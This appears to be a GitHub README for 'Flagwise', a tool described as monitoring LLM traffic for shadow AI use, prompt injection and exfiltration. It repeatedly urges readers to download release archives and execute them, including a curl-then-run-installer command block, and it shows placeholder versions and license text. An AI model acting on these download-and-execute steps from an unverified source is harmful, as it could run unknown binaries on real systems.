# Flagwise — Monitor, Detect, and Analyze Shadow AI in LLMs
[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github&style=flat)](https://github.com/BMolapisi/flagwise/releases) https://github.com/BMolapisi/flagwise/releases

![Flagwise banner](https://images.unsplash.com/photo-1555949963-3a22d0f8ab5a?auto=format&fit=crop&w=1400&q=80)

Badges
- ![ai-analytics](https://img.shields.io/badge/ai--analytics-flagwise-green)
- ![ai-compliance](https://img.shields.io/badge/ai--compliance-flagwise-green)
- ![ai-governance](https://img.shields.io/badge/ai--governance-flagwise-green)
- ![ai-observability](https://img.shields.io/badge/ai--observability-flagwise-green)
- ![llm-monitoring](https://img.shields.io/badge/llm--monitoring-flagwise-orange)
- ![shadow-ai-detector](https://img.shields.io/badge/shadow--ai--detector-flagwise-red)

About Flagwise
Flagwise monitors LLM traffic, detects security threats, and flags Shadow AI use. It fuses observability with threat analysis. It provides dashboards, alerts, and forensic logs for LLM-driven systems.

Key features
- Traffic capture for LLM requests and responses.
- Shadow AI detection using model fingerprinting and drift signals.
- Rule-based and ML-based threat detection.
- Real-time alerts via webhooks, Slack, and email.
- Forensic audit logs with request replay.
- Privacy-preserving telemetry and configurable retention.
- Dashboards and analytics for compliance and governance.
- CLI and SDKs to integrate into pipelines and apps.

Why use Flagwise
- Find hidden model calls that bypass controls.
- Detect exfiltration, prompt injection, and poisoned content.
- Track model lineage and vendor usage.
- Correlate LLM usage to user ID, app, and endpoint.
- Prove compliance with audit-ready logs.

Quick demo GIF
![demo](https://raw.githubusercontent.com/BMolapisi/flagwise/main/docs/assets/demo.gif)

Install and run (releases)
Download the latest release and execute the installer. The release files are available at:
https://github.com/BMolapisi/flagwise/releases

Download the release package, extract it, and run the installer. Example commands:
```bash
# Download the latest release archive (replace URL with the chosen asset)
curl -L -o flagwise-latest.tar.gz "https://github.com/BMolapisi/flagwise/releases/download/vX.Y.Z/flagwise-vX.Y.Z-linux-amd64.tar.gz"

# Extract
tar -xzf flagwise-latest.tar.gz

# Change to extracted folder
cd flagwise-*

# Run the installer or binary
./install.sh
# or run the binary directly
./flagwise server --config ./config.yaml
```
The release file needs to be downloaded and executed.

Quickstart (Docker)
```bash
# Pull the official Flagwise image
docker pull bmolapisi/flagwise:latest

# Run with a mounted config
docker run -d --name flagwise \
  -v $(pwd)/config.yaml:/etc/flagwise/config.yaml \
  -p 8080:8080 \
  bmolapisi/flagwise:latest

# Check logs
docker logs -f flagwise
```

Core concepts
- Collector: Captures LLM traffic from proxies, SDK wrappers, or network taps.
- Fingerprint: A model and vendor signature extracted from responses and metadata.
- Shadow AI: Any external or non-approved model used by an app or user.
- Rules: Signature-based rules for known threats like prompt injection.
- Detectors: ML modules that detect drift, hallucination spikes, and data exfiltration signals.
- Stream: Real-time pipeline that scores every request and issues alerts.

Architecture overview
![architecture diagram](https://raw.githubusercontent.com/BMolapisi/flagwise/main/docs/assets/architecture.png)

1. Ingest: Collectors receive traffic from SDKs, proxies, or agentless taps.
2. Parse: Parsers normalize requests and responses. Extract metadata and tokens.
3. Detect: Fingerprinters and detectors classify model usage and risk.
4. Store: Encrypted event store holds logs and transcripts with retention policies.
5. Alert: Alert engine maps detections to channels and severity.
6. UI: Dashboards show trends, detections, and audit trails.

Detection methods
- Model fingerprinting: Use response patterns, timing, tokenization, and headers to classify model vendor and version.
- Prompt injection signatures: Match prompt patterns that aim to override instructions or exfiltrate secrets.
- Drift detection: Monitor statistical shifts in output entropy, token length, and topical drift.
- Watermark correlation: Detect known watermarks if providers embed them.
- API traffic correlation: Correlate outgoing API calls and billing spikes to detect shadow model usage.
- Behavioral scoring: Score users and endpoints on risk based on historical patterns.

Alerting and playbooks
- Alert types: Info, Warning, Critical.
- Integrations: Slack, PagerDuty, webhooks, email, syslog.
- Playbooks: Prebuilt response playbooks for common incidents:
  - Exfiltration suspected: throttle user, snapshot conversation, escalate to SOC.
  - Unapproved model usage: block endpoint, notify app owner, start audit.
  - Prompt injection: isolate session, flag for content review.

Rules and policies
- Policy engine uses YAML policies that map detections to actions.
- Example policy keys:
  - allow_models
  - block_models
  - sensitive_data_patterns
  - retention_days
- Policies run in the pipeline and update in real time.

Data retention and privacy
- Event store supports retention windows and deletion.
- Transcripts encrypt at rest and in transport.
- Masking: PII masking functions run on sensitive fields before storage.
- Configurable TTL: Set retention per project or environment.

Integrations
- Cloud providers: AWS S3, GCS, Azure Blob for archive.
- SIEM: Splunk, Elastic, Sumo Logic.
- Identity: Okta, Keycloak, Auth0 for user mapping.
- Observability: Prometheus metrics, OpenTelemetry traces.
- Chat and incident channels: Slack, Microsoft Teams, PagerDuty.

APIs and SDKs
- REST API: CRUD for rules, fetch events, query detectors.
- Webhook: Push detections to any HTTP endpoint.
- SDKs: Node, Python, Go for easy instrumentation.
- Example API call
```bash
curl -X POST "http://localhost:8080/api/v1/detect" \
  -H "Authorization: Bearer <API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"request": {"prompt":"<user prompt>", "response":"<model output>"}}'
```

CLI
- flagwise status
- flagwise analyze --file session.json
- flagwise export --from 2025-01-01 --to 2025-02-01 --format json

Configuration example (config.yaml)
```yaml
server:
  host: 0.0.0.0
  port: 8080

storage:
  type: postgres
  uri: postgres://flagwise:pass@db/flagwise

detectors:
  enable_fingerprint: true
  enable_drift: true

alerts:
  slack:
    webhook: https://hooks.slack.com/services/XXX/YYY/ZZZ

policy:
  allow_models:
    - openai/gpt-4
  block_models:
    - unknown
```

Dashboards
- Key dashboards:
  - Overview: traffic volume, model mix, risk score.
  - Alerts: active incidents and history.
  - Model usage: vendor share, versions, latency.
  - Compliance: retention and audit status.

Common use cases
- Governance: Track which models apps actually use across teams.
- Security: Detect prompt injection and data exfiltration attempts.
- Cost control: Spot spikes that indicate shadow models or abuse.
- Compliance: Generate audit trails for regulators and internal reviews.
- Vendor comparison: Compare outputs and drift across models.

Detection tuning
- Start with conservative thresholds.
- Use a baseline period to capture normal behavior.
- Tune fingerprint and drift sensitivity per workload.
- Add false positive rules for known benign patterns.

Forensic tools
- Session replay: Re-run captured prompts against a sandbox.
- Token traces: Show token-level usage and entity patterns.
- Snapshot export: Export a locked package for an incident review.

Scaling and performance
- Use horizontal collectors for high throughput.
- Route heavy analysis to batch workers.
- Sample low-risk traffic for cost control.
- Use GPU workers for heavy ML detectors.

Security model
- Run Flagwise in your VPC or on-prem.
- Limit access with role-based access control.
- Use HSM or KMS for encryption keys.
- Audit every config change and detection.

Contributing
- Open an issue for bugs or feature requests.
- Fork the repo and submit pull requests with tests.
- Follow the code style and include unit tests.
- Check the Releases page for latest binaries and changelogs:
  https://github.com/BMolapisi/flagwise/releases

Roadmap
- Plugin system for custom detectors.
- Native support for more model vendors.
- Real-time lineage tracing across services.
- Advanced privacy controls and certified storage exports.

FAQ
Q: How do you detect unknown models?
A: We use response fingerprinting, timing, and header patterns to infer vendor signals and mark unknown models as shadow AI.

Q: Can I run Flagwise entirely offline?
A: Yes. Deploy in private networks. Turn off external telemetry and use on-prem storage.

Q: How do alerts map to incident severity?
A: Each detector returns a score. Policies map score ranges to Info, Warning, or Critical. You can override mapping per project.

Support and contact
- Raise issues on GitHub Issues.
- For enterprise support, open an issue titled "enterprise-support" and include contact details.

License
- MIT (or replace with your preferred license file in the repo).

Maintainers
- B. Molapisi — lead
- Community contributors — see CONTRIBUTORS.md

Changelog & downloads
Find release packages and installers. Download the release file that matches your platform and execute it per the included README in the release asset. Releases:  
https://github.com/BMolapisi/flagwise/releases

Files to check in the release asset:
- flagwise-vX.Y.Z-linux-amd64.tar.gz (download and execute)
- flagwise-vX.Y.Z-windows.zip (download and run)
- INSTALL.md
- CHANGELOG.md

License, Code of Conduct, and Contributing guides live in the repo.